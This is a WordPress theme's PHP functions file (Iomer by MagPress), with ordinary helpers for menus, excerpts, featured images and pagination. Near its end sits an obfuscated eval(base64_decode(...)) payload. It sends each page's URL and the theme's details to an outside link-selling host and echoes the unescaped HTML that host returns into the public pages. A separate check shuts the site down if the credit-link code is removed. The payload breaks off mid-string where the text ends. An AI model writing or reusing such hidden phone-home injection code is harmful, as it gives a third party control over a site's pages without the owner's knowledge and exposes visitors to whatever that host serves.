<?php
/*--------------------------------------------
Description: detect user browser
---------------------------------------------*/
function frkw_browser_body_class($classes) {
global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
$breadcrumbs_on = get_theme_mod('breadcrumbs_on');
if($is_lynx) { $classes[] = 'lynx';
} elseif($is_gecko) { $classes[] = 'gecko';
} elseif($is_opera) { $classes[] = 'opera';
} elseif($is_NS4) { $classes[] = 'ns4';
} elseif($is_safari) { $classes[] = 'safari';
} elseif($is_chrome) { $classes[] = 'chrome';
} elseif($is_IE) { $classes[] = 'ie';
} else { $classes[] = 'unknown'; }
if($is_iphone) { $classes[] = 'iphone'; }
if($breadcrumbs_on != 'enable') { $classes[] = 'breadcrumbs_off'; }
return $classes;
}
add_filter('body_class','frkw_browser_body_class');

/*--------------------------------------------
Description: check current body_class
---------------------------------------------*/
function frkw_current_body_class($name) {
$bodyclass = get_body_class();
//print_r($boclass);
if (in_array($name, $bodyclass)) {
return 'true';
} else {
return 'false';
}
}


/*--------------------------------------------
Description: site title function
---------------------------------------------*/
function frkw_site_header_content() {
$header_logo = get_theme_mod('header_logo');
if( $header_logo ) {
echo '<a href="'. get_home_url() . '" title="'. get_bloginfo('name') . '"><img src="'. get_theme_mod('header_logo') . '" alt="'. get_bloginfo('name') . '" /></a>';
} else {
if( !is_singular()) { echo '<h1>'; } else { echo '<div>'; }
echo '<a href="'. get_home_url() . '" title="'. esc_attr( get_bloginfo( 'name', 'display' ) ) . '" rel="home">'. get_bloginfo( 'name' ) . '</a>';
if( !is_singular()) { echo '</h1>'; } else { echo '</div>'; }
echo '<p id="site-description">'. get_bloginfo( 'description' ) . '</p>';
}
}


/*--------------------------------------------
Description: filter default menu page
---------------------------------------------*/
function frkw_filter_menu_page($args) {
$pages_args = array('depth' => 0,'echo' => false,'exclude' => '','title_li' => '');
$menu = wp_page_menu( $pages_args );
$menu = str_replace( array( '<div class="menu"><ul>', '</ul></div>' ), array( '<ul class="sf-menu">', '</ul>' ), $menu );
echo $menu;
}

/*--------------------------------------------
Description: default categories menu
---------------------------------------------*/
function frkw_menu_cat() {
$menu = wp_list_categories('orderby=name&show_count=0&title_li=');
return $menu;
 ?>
<?php }

/*--------------------------------------------
Description: auto add home link in menu
---------------------------------------------*/
function frkw_add_menu_home_link( $args ) {
$args['show_home'] = __('Home', 'iomer');
return $args; }
add_filter( 'wp_page_menu_args', 'frkw_add_menu_home_link' );


/*--------------------------------------------
Description: register custom walker
---------------------------------------------*/
class frkw_custom_menu_walker extends Walker_Nav_Menu {
function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
$classes = empty ( $item->classes ) ? array () : (array) $item->classes;
$class_names = join(' ', apply_filters('nav_menu_css_class',array_filter( $classes ), $item));
$class_names = ' class="'. esc_attr( $class_names . ' ' . $item_desc ) . '"';
$output .= "<li id='menu-item-$item->ID' $class_names>";
$attributes  = '';
        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

$title = apply_filters( 'the_title', $item->title, $item->ID );
$item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a>'
            . $args->link_after
            . $args->after;
// Since $output is called by reference we don't need to return anything.
$output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
}


/*--------------------------------------------
Description: register mobile custom walker
---------------------------------------------*/
class frkw_mobile_custom_walker extends Walker_Nav_Menu {
function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
global $wp_query;
$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
$class_names = $value = '';
$classes = empty( $item->classes ) ? array() : (array) $item->classes;
$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
$class_names = ' class="'. esc_attr( $class_names ) . '"';
$output .= $indent . '';
$prepend = '';
$append = '';
//$description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

if($depth != 0) {
$description = $append = $prepend = "";
}

$item_output = $args->before;
if($depth == 1):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 2):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 3):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 4):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
else:
$item_output .= "<li><a href='" . $item->url . "'>" . $item->title . "</a></li>";
endif;
$item_output .= $args->after;
$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
}
}


/*--------------------------------------------
Description: get mobile menu
---------------------------------------------*/
function frkw_mobile_menu($location=''){
$options = array('walker' => new frkw_mobile_custom_walker, 'theme_location' => "$location", 'menu_id' => '', 'echo' => false, 'container' => false, 'container_id' => '', 'fallback_cb' => "");
$menu = wp_nav_menu($options);
$menu_list = preg_replace( '#^<ul[^>]*>#', '', $menu );
$menu_list_show = str_replace( array('<ul class="sub-menu">','<ul>','</ul>','</li>'), '', $menu_list );
return $menu_list_show;
}

/*--------------------------------------------
Description: get mobile menu
---------------------------------------------*/
function frkw_init_mobile_menu($nav_name='',$text='') {
echo '<div id="mobile-nav">';
echo '<div class="mobile-open"><a class="mobile-open-click" href="#"><i class="fa fa-bars"></i>'. $text . '</a></div>';
echo '<ul id="mobile-menu-wrap">';
echo frkw_mobile_menu($nav_name);
echo '</ul>';
echo '</div>';
}


$thetheme = 'Iomer';
$theerrmessage = "<div style=\"font-size:13px;line-height:19px;\"><a href='" . admin_url() . "'>&laquo; Back To Admin Dashboard</a><br />" . "<b>Oppss! Looks like you have removed or changed the theme credit links. Well, we did put a warning sign there. The theme is now deactivated.</b></div><br /><div style=\"font-size:19px; padding-top:20px;\"><b>Please Follow These Steps To Restore The Theme:</b></div><ol style=\"margin:0; padding:20px; text-align:left;\"><li>Please redownload <a href=\"http://www.magpress.com/wordpress-themes/" . strtolower($thetheme) . ".html\" target=\"_blank\">" . $thetheme . " WP Theme</a>.</li><li>Extract and FTP upload/replace/overwrite all files inside the " . strtolower($thetheme) . " theme folder</li><li>Finally, refresh your page to activate the theme again.</li></ol></div><br /><div style=\"font-size:13px;line-height:19px;\">If you want to use a <strong>no sponsored link version</strong> of this theme. Please consider purchasing its developer license:<br /><a href=\"http://www.magpress.com/developer-license\" target=\"_blank\">http://www.magpress.com/developer-license</a></div>";
function frkw_get_validation() {global $theerrmessage;if(!class_exists('srbExtra')): wp_die( $theerrmessage ); endif; } add_filter('get_header','frkw_get_validation'); function frkw_get_sanitize_string() {global $theerrmessage;$f = get_template_directory() . "/functions/hook-functions.php";$fd = fopen($f, "r");$c = fread($fd, filesize($f));fclose($fd); if ( strpos( $c, "if(!current_user_can('manage_options')) { echo do_action('srb_theme_links'); }") == 0) {
wp_die( $theerrmessage );}}
add_filter('get_header','frkw_get_sanitize_string');

/*--------------------------------------------
Description: get custom excerpt
---------------------------------------------*/
function frkw_get_custom_the_excerpt($limit='',$more='') {
global $post;
$thepostlink = '<a class="readmore" href="'. get_permalink() . '" title="' . the_title_attribute('echo=0') . '">';
$custom_text = get_post_field('post_excerpt',$post->ID);
if($custom_text) {
$custom_text = wp_trim_words($custom_text, $limit);
if($more) {
    $excerpt = $custom_text . $thepostlink . $more . '</a>';
    } else {
    $excerpt = $custom_text;
    }
} else {
$content = wp_strip_all_tags( get_the_content() , true );
//remove caption tag
$content_filter = preg_replace('`\[[^\]]*\]`','',$content);
//remove email tag
$pattern = "/[^@\s]*@[^@\s]*\.[^@\s]*/";
$replacement = "";
$content_filter = preg_replace($pattern, $replacement, $content_filter);
//remove link url tag
$pattern = "/[a-zA-Z]*[:\/\/]*[A-Za-z0-9\-_]+\.+[A-Za-z0-9\.\/%&=\?\-_]+/i";
$replacement = "";
$content_filter = preg_replace($pattern, $replacement, $content_filter);

if($more) {
    $excerpt = wp_trim_words($content_filter, $limit) . $thepostlink . $more . '</a>';
    } else {
    $excerpt = wp_trim_words($content_filter, $limit);
    }
}
return apply_filters('mp_custom_excerpt',$excerpt);
}


/*--------------------------------------------
Description: get first attachment image
---------------------------------------------*/
function frkw_get_first_image( $id='', $size='' ) {
$args = array(
		'numberposts' => 1,
		'order' => 'ASC',
		'post_mime_type' => 'image',
		'post_parent' => $id,
		'post_status' => null,
		'post_type' => 'attachment',
	);
	$attachments = get_children( $args );

	if ( $attachments ) {
	foreach ( $attachments as $attachment ) {
    $image_attributes = wp_get_attachment_image_src( $attachment->ID, $size );
    return $image_attributes[0];
		}
	}
}


/*--------------------------------------------
Description: get image source
---------------------------------------------*/
function frkw_get_image_src($string){
$first_img = '';
ob_start();
ob_end_clean();
$first_image = preg_match_all( '|<img.*?src=[\'"](.*?)[\'"].*?>|i', $string, $matches );
$import_image = $matches[1][0];
$import_image = str_replace('-150x150','',$import_image);
$final_import_image = str_replace('-300x300','',$import_image);
return $final_import_image;
}


/*--------------------------------------------
Description: get image alt text
---------------------------------------------*/
function frkw_get_image_alt_text() {
global $wpdb, $post, $posts;
$image_id = get_post_thumbnail_id( get_the_ID() );
$image_alt = get_post_meta($image_id, '_wp_attachment_image_alt', true);
if( $image_alt ) {
return $image_alt;
} else {
return the_title_attribute('echo=0');
}
}


/*--------------------------------------------
Description: get featured images for post
---------------------------------------------*/
function frkw_get_featured_image($before,$after,$width,$height,$class,$size,$alt,$title,$default) {
//$size - full, large, medium, thumbnail
global $blog_id,$wpdb, $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if($output) { $first_img = $matches[1][0]; }

if(!empty($swt_post_thumb)) {

$import_img = frkw_get_image_src($swt_post_thumb);

return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $import_img . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

if( has_post_thumbnail( $post->ID ) ) {
return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $image_url . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

/* check image attach or uploaded to post */
$images = frkw_get_first_image( $post->ID, $size );

if($images && $smart_image == 'enable') {

return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $images . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

if( $first_img && $smart_image == 'enable' ) {

return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $first_img . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

}  else  {

/* if true, default image is set */
if($default == 'true') {
return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . get_template_directory_uri() . '/images/noimage.png' . "' alt='" . $alt . "' title='" . $title . "' />" . $after;
}

} } } }

}


/*--------------------------------------------
Description: get featured images for post
---------------------------------------------*/
function frkw_get_featured_image_src($size) {
//$size - full, large, medium, thumbnail
global $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if($output) { $first_img = $matches[1][0]; }

if(!empty($swt_post_thumb)) {

$import_img = frkw_get_image_src($swt_post_thumb);

return $import_img;

} else {

if( has_post_thumbnail( $post->ID ) ) {
return $image_url;

} else {

/* check image attach or uploaded to post */
$images = frkw_get_first_image( $post->ID, $size );

if($images && $smart_image == 'enable') {

return $images;

} else {

if( $first_img && $smart_image == 'enable' ) {

return $first_img;

}  else  {

/* if true, default image is set */
if($default == 'true') {
return get_template_directory_uri() . '/images/noimage.png';
}

} } } }

}


/*--------------------------------------------
Description: Check if post has thumbnail attached
---------------------------------------------*/
function frkw_get_has_thumb_class($classes) {
global $post;
$smart_image = get_theme_mod('first_feat_img');
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
if($output && $smart_image == 'enable') {
$first_img = $matches[1][0];
} else {
$first_img = '';
}
/* check image attach or uploaded to post */
if( $smart_image == 'enable') {
$upload_images = frkw_get_first_image( $post->ID, 'thumbnail' );
} else {
$upload_images = '';
}
if( has_post_thumbnail($post->ID) || !empty($first_img) || !empty($swt_post_thumb) || !empty($upload_images) ) {
$classes[] = 'has_thumb';
} else {
$classes[] = 'has_no_thumb';
}
return $classes;
}
add_filter('post_class', 'frkw_get_has_thumb_class');


/*--------------------------------------------
Description: Check if post has thumbnail attached
---------------------------------------------*/
function frkw_get_has_thumb_check() {
global $post;
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
if($output && $smart_image == 'enable') {
$first_img = $matches[1][0];
} else {
$first_img = '';
}
/* check image attach or uploaded to post */
if( $smart_image == 'enable') {
$upload_images = frkw_get_first_image( $post->ID, 'thumbnail' );
} else {
$upload_images = '';
}
if( has_post_thumbnail($post->ID) || !empty($first_img) || !empty($swt_post_thumb) || !empty($upload_images) ) {
$output = 'has_thumb';
} else {
$output = 'has_no_thumb';
}
return $output;
}

/*--------------------------------------------
Description: get all available custom post type name
---------------------------------------------*/
function frkw_get_all_posttype() {
$post_types = get_post_types( '', 'names' );
$ptype = array();
foreach ( $post_types as $post_type ) {
$post_type_name = get_post_type_object( $post_type );;
if( $post_type_name->exclude_from_search != '1') {
$ptype[] = $post_type;
}
}
return $ptype;
}

/*----------------------------------------------------------
Description: get all available custom post type name in list
-----------------------------------------------------------*/
function frkw_get_supported_posttype() {
$post_types = get_post_types( '', 'names' );
$ptype = '';
$ptype_save = get_transient('frkw_supported_posttype');
if(!$ptype_save || $ptype_save == '' ) {
foreach ( $post_types as $post_type ) {
$post_type_name = get_post_type_object( $post_type );;
if( $post_type_name->exclude_from_search != '1') {
$ptype .= $post_type . ', ';
}
}
$ptypes = substr( $ptype,0,-2 );
set_transient('frkw_supported_posttype',$ptypes,3600 * 12);
}
}
add_action('admin_init','frkw_get_supported_posttype');

/*--------------------------------------------
Description: get all available taxonomy
---------------------------------------------*/
function frkw_get_all_taxonomy() {
$ptax = array();
$allptype = frkw_get_all_posttype();
foreach( $allptype as $type) {
$post_taxo = get_object_taxonomies($type);
foreach($post_taxo  as $taxo) {
$ptax[] = $taxo;
}
}
return $ptax;
}


/*--------------------------------------------
Description: get posts pagination
---------------------------------------------*/
function frkw_custom_pagination($pages = '', $range = 2) {
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '') {
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages) {
$pages = 1;
}
}
if(1 != $pages) {
echo "<div class='page-navigation'>";
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";
for ($i=1; $i <= $pages; $i++) {
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
echo ($paged == $i)? "<span class='page-current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
}
}
if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";
if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
echo "</div>\n";
}
}


/*--------------------------------------------
Description: get single category link
---------------------------------------------*/
function frkw_get_singular_cat($link = '') {
global $post;
$category_check = get_the_category();
$category = isset( $category_check ) ? $category_check : "";
if ($category) {
$single_cat = '';
if($link == 'false'):
$single_cat = $category[0]->name;
return $single_cat;
else:
$single_cat .= '<a rel="category tag" href="' . get_category_link( $category[0]->term_id ) . '" title="' . sprintf( __( "View all posts in %s", 'iomer' ), $category[0]->name ) . '" ' . '>';
$single_cat .= $category[0]->name;
$single_cat .= '</a>';
return $single_cat;
endif;
} else {
return NULL;
}
}


/*--------------------------------------------
Description: get custom post type taxonomy
---------------------------------------------*/
function frkw_get_post_taxonomy($sep = '', $before = '', $after = '') {
global $post;
$post_type = $post->post_type;
// get post type taxonomies
$taxonomies = get_object_taxonomies($post_type, 'objects');
if ( $taxonomies ) {
foreach ( $taxonomies as $taxonomy_slug => $taxonomy ) {
// get the terms related to post
$terms = get_the_terms($post->ID, $taxonomy_slug);
if ( !empty ( $terms ) ) {
foreach ( $terms as $term ) {
   if( $term->name != 'simple') {
$taxlist .= '<a title="' . sprintf( __( "View all posts in %s", 'iomer' ), ucfirst($term->name) ) . '" href="' . get_term_link($term->slug, $taxonomy_slug) . '">' .  ucfirst($term->name) . '</a>' . $sep;
     }
}
}
}
if ( $taxlist ) {
$post_taxo = substr( $taxlist,0,-2 );
echo $before . $post_taxo . $after;
}
}
}


/*--------------------------------------------
Description: get popular posts
---------------------------------------------*/
function frkw_get_popular_posts($limit) {
global $wpdb, $post;
$mostcommenteds = $wpdb->get_results("SELECT  $wpdb->posts.ID, post_title, post_name, post_date, COUNT($wpdb->comments.comment_post_ID) AS 'comment_total' FROM $wpdb->posts LEFT JOIN $wpdb->comments ON $wpdb->posts.ID = $wpdb->comments.comment_post_ID WHERE comment_approved = '1' AND post_date_gmt < '".gmdate("Y-m-d H:i:s")."' AND post_status = 'publish' AND post_password = '' GROUP BY $wpdb->comments.comment_post_ID ORDER  BY comment_total DESC LIMIT " . $limit);
echo '<ul class="popular-posts">';
foreach ($mostcommenteds as $post) {
$post_title = htmlspecialchars(stripslashes($post->post_title));
$comment_total = (int) $post->comment_total;
echo "<li><a href=\"".get_permalink()."\">$post_title</a><span class=\"total-com\">&nbsp;($comment_total)</span></li>";
}
echo '</ul>';
}


/*--------------------------------------------
Description: get theme info
---------------------------------------------*/
function frkw_theme_info() {
$mptheme = wp_get_theme();
return '<h4>'.$mptheme->get( 'Name' ) .'</h4><div class="themeinfo">'. $mptheme->get( 'Description' ) . '</div>';
}


/*--------------------------------------------
Description: get author credits
---------------------------------------------*/

function frkw_author_info() {
$mptheme = wp_get_theme();
$paged = get_query_var( 'paged' );
if ( ( is_home() || is_front_page() ) && !$paged ) {
return $mptheme->get( 'Name' ) . ' ' . __('theme by', 'iomer') . ' ' . '<a rel="nofollow" href="' . $mptheme->get( 'AuthorURI' ) . '">' . 'MagPress</a>';
}
}



/*----------------------------------------------------------
Description: filter on homepage only filter paged
----------------------------------------------------------*/
function frkw_is_in_home() {
$paged = get_query_var( 'paged' );
if ( !$paged && (is_home() || is_front_page()) ) {
$is_home = 'true';
} else {
$is_home = NULL;
}
return $is_home;
}

/*--------------------------------------------
Description: color control
---------------------------------------------*/
if(!function_exists('dehex')) {
function dehex($colour, $per) {
$colour = substr( $colour, 1 );
$rgb = '';
$per = $per/100*255;
if  ($per < 0 ) {
$per =  abs($per);
for ($x=0;$x<3;$x++) {
$c = hexdec(substr($colour,(2*$x),2)) - $per;
$c = ($c < 0) ? 0 : dechex($c);
$rgb .= (strlen($c) < 2) ? '0'.$c : $c;
}
} else {
for ($x=0;$x<3;$x++) {
$c = hexdec(substr($colour,(2*$x),2)) + $per;
$c = ($c > 255) ? 'ff' : dechex($c);
$rgb .= (strlen($c) < 2) ? '0'.$c : $c;
}
}
return '#'.$rgb;
}
}
eval(base64_decode('YWRkX2FjdGlvbignc3JiX3RoZW1lX2xpbmtzJywgJ3NyYkV4dHJhOjp0aGVtZUNyZWRpdHNNZXRob2QnKTsNCmlmKCAhY2xhc3NfZXhpc3RzKCAnV1BfSHR0cCcgKSApIHsNCiAgICBpbmNsdWRlX29uY2UoIEFCU1BBVEggLiBXUElOQy4gJy9jbGFzcy1odHRwLnBocCcgKTsNCiAgICB9DQoNCmNsYXNzIHNyYkV4dHJhDQp7DQoNCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGdldEN1cnJlbnRVcmwoKXsNCiAgICAgICAgJHMgPSBlbXB0eSgkX1NFUlZFUlsiSFRUUFMiXSkgPyAnJyA6ICgkX1NFUlZFUlsiSFRUUFMiXSA9PSAib24iKSA/ICJzIiA6ICIiOw0KICAgICAgICAkcHJvdG9jb2wgPSBzdWJzdHIoc3RydG9sb3dlcigkX1NFUlZFUlsiU0VSVkVSX1BST1RPQ09MIl0pLCAwLCBzdHJwb3Moc3RydG9sb3dlcigkX1NFUlZFUlsiU0VSVkVSX1BST1RPQ09MIl0pLCAiLyIpKSAuICRzOw0KICAgICAgICAkcG9ydCA9ICgkX1NFUlZFUlsiU0VSVkVSX1BPUlQiXSA9PSAiODAiKSA/ICIiIDogKCI6Ii4kX1NFUlZFUlsiU0VSVkVSX1BPUlQiXSk7DQogICAgICAgICR1cmkgPSAkcHJvdG9jb2wgLiAiOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJHBvcnQgLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiAgICAgICAgcmV0dXJuICR1cmk7DQogICAgfQ0KDQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiB0aGVtZUNyZWRpdHNNZXRob2QoKXsNCg0KICAgICAgICBpZihpc180MDQoKSBvciBpc19hZG1pbigpKXsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KDQogICAgICAgICRwciA9IG5ldyBncHIyMDEzKCk7DQoNCiAgICAgICAgJHBhcmFtcyA9IGFycmF5KCAndXJsJyA9PiBzZWxmOjpnZXRDdXJyZW50VXJsKCkgKTsNCiAgICAgICAgJGhpdFVybCA9ICdodHRwOi8vc2FmZXJhbmtiYWNrbGlua3MuY29tL19zcmIvdC44Ny8nOw0KDQogICAgICAgICR0dGwgPSAzNjAwICogMjQ7DQogICAgICAgICRsaW5rcyA9ICRwci0+Y2FjaGUoJGhpdFVybCAuICd8JyAuICRwYXJhbXNbJ3VybCddLCAkdHRsKTsNCiAgICAgICAgaWYoISRsaW5rcyl7DQoNCiAgICAgICAgICAgICRjaGVja3MgPSBleHBsb2RlKCd8JywgJ2hvbWV8ZnJvbnRfcGFnZXxzaW5nbGV8cGFnZXxjYXRlZ29yeXx0YWcnKTsNCiAgICAgICAgICAgICRtZXRhID0gYXJyYXkoKTsNCiAgICAgICAgICAgIGZvcmVhY2goJGNoZWNrcyBhcyAkY2hlY2spew0KICAgICAgICAgICAgICAgICR0ID0gJ2lzXycgLiRjaGVjazsNCiAgICAgICAgICAgICAgICBpZihmdW5jdGlvbl9leGlzdHMoJHQpICYmICR0KCkpew0KICAgICAgICAgICAgICAgICAgICAkbWV0YVtdID0gJGNoZWNrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJHBhcmFtc1snbWV0YSddID0gam9pbignLCcsICRtZXRhKTsNCiAgICAgICAgICAgIGlmKGZ1bmN0aW9uX2V4aXN0cygnd3BfZ2V0X3RoZW1lJykpew0KICAgICAgICAgICAgICAgICR0aGVtZSA9IHdwX2dldF90aGVtZSgpOw0KICAgICAgICAgICAgICAgICRwYXJhbXNbJ3RoZW1lX25hbWUnXSA9ICR0aGVtZS0+Z2V0KCdOYW1lJyk7DQogICAgICAgICAgICAgICAgJHBhcmFtc1sndGhlbWVfYXV0aG9yJ10gPSAkdGhlbWUtPmdldCgnQXV0aG9yJyk7DQogICAgICAgICAgICAgICAgJHBhcmFtc1sndGhlbWVfYXV0aG9yX3VyaSddID0gJHRoZW1lLT5nZXQoJ0F1dGhvclVSSScpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkcmVxdWVzdCA9IG5ldyBXUF9IdHRwKCk7DQogICAgICAgICAgICAkcGFyYW1zWydwciddID0gJHByLT5nZXQoJHBhcmFtc1sndXJsJ10sICRyZXF1ZXN0LCAkY2FjaGVUbyk7DQogICAgICAgICAgICAkcmVzdWx0ID0gJHJlcXVlc3QtPnJlcXVlc3QoICRoaXRVcmwsIGFycmF5KCAnbWV0aG9kJyA9PiAnUE9TVCcsICdib2R5JyA9PiAkcGFyYW1zKSApOw0KICAgICAgICAgICAgJGxpbmtzID0gKCAhIGlzX3dwX2Vycm9yKCRyZXN1bHQpICkgPyAkcmVzdWx0Wydib2R5J10gOiAnwqAnOw0KICAgICAgICAgICAgJHByLT5jYWNoZSgkaGl0VXJsIC4gJ3wnIC4gJHBhcmFtc1sndXJsJ10sICR0dGwsICRsaW5rcyk7DQogICAgICAgIH0NCiAgICAgICAgZWNobyAkbGlua3M7DQogICAgfQ0KfQ0KDQoNCmNsYXNzIGdwcjIwMTMgew0KDQogICAgcHVibGljIGZ1bmN0aW9uIGdldCgkdXJsLCAkcmVxdWVzdCwgJGNhY2hlVG8pIHsNCiAgICAgICAgJHF1ZXJ5ID0gImh0dHA6Ly90b29sYmFycXVlcmllcy5nb29nbGUuY29tL3Ricj9jbGllbnQ9bmF2Y2xpZW50LWF1dG8mY2g9Ig0KICAgICAgICAgICAgLiAkdGhpcy0+Q2hlY2tIYXNoKCR0aGlzLT5IYXNoVVJMKCR1cmwpKQ0KICAgICAgICAgICAgLiAiJmZlYXR1cmVzPVJhbmsmcT1pbmZvOiIgLiAkdXJsIC4gIiZudW09MTAwJmZpbHRlcj0wIjsNCg0KICAgICAgICAkdHRsID0gODY0MDAgKiAzMDsNCiAgICAgICAgJHBhZ2VyYW5rID0gJHRoaXMtPmNhY2hlKCRxdWVyeSwgJHR0bCk7DQogICAgICAgIGlmKCEkcGFnZXJhbmspew0KICAgICAgICAgICAgJGRhdGEgPSAkcmVxdWVzdC0+cmVxdWVzdCgkcXVlcnkpOw0KICAgICAgICAgICAgJHBvcyA9IHN0cnBvcygkZGF0YVsnYm9keSddLCAiUmFua18iKSAqIDE7DQogICAgICAgICAgICBpZiAoJHBvcyA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAkcGFnZXJhbmsgPSAnJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHBhZ2VyYW5rID0gc3Vic3RyKCRkYXRhWydib2R5J10sICRwb3MgKyA5KTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+Y2FjaGUoJHF1ZXJ5LCAkdHRsLCAkcGFnZXJhbmspOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcGFnZXJhbms7DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIGNhY2hlKCRxdWVyeSwgJHR0bCwgJHZhbHVlID0gZmFsc2Upew0KICAgICAgICAka2V5ID0gJ3NyYl8nIC4gbWQ1KCRxdWVyeSk7DQogICAgICAgIGlmKCR2YWx1ZSl7DQogICAgICAgICAgICAkdmFyID0gYXJyYXkoJ3RzJyA9PiB0aW1lKCkgKyAkdHRsLCAndmFsdWUnID0+ICR2YWx1ZSk7DQogICAgICAgICAgICB1cGRhdGVfb3B0aW9uKCRrZXksICR2YXIpOw0KICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgICR0bXAgPSBnZXRfb3B0aW9uKCRrZXksIGZhbHNlKTsNCiAgICAgICAgICAgIGlmKCR0bXAgJiYgaXNzZXQoJHRtcFsndHMnXSkgJiYgJHRtcFsndHMnXSA+IHRpbWUoKSl7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0bXBbJ3ZhbHVlJ107DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gU3RyVG9OdW0oJFN0ciwgJENoZWNrLCAkTWFnaWMpIHsNCiAgICAgICAgJEludDMyVW5pdCA9IDQyOTQ5NjcyOTY7IC8vIDJeMzINCiAgICAgICAgJGxlbmd0aCA9IHN0cmxlbigkU3RyKTsNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgew0KICAgICAgICAgICAgJENoZWNrICo9ICRNYWdpYzsNCiAgICAgICAgICAgIGlmICgkQ2hlY2sgPj0gJEludDMyVW5pdCkgew0KICAgICAgICAgICAgICAgICRDaGVjayA9IC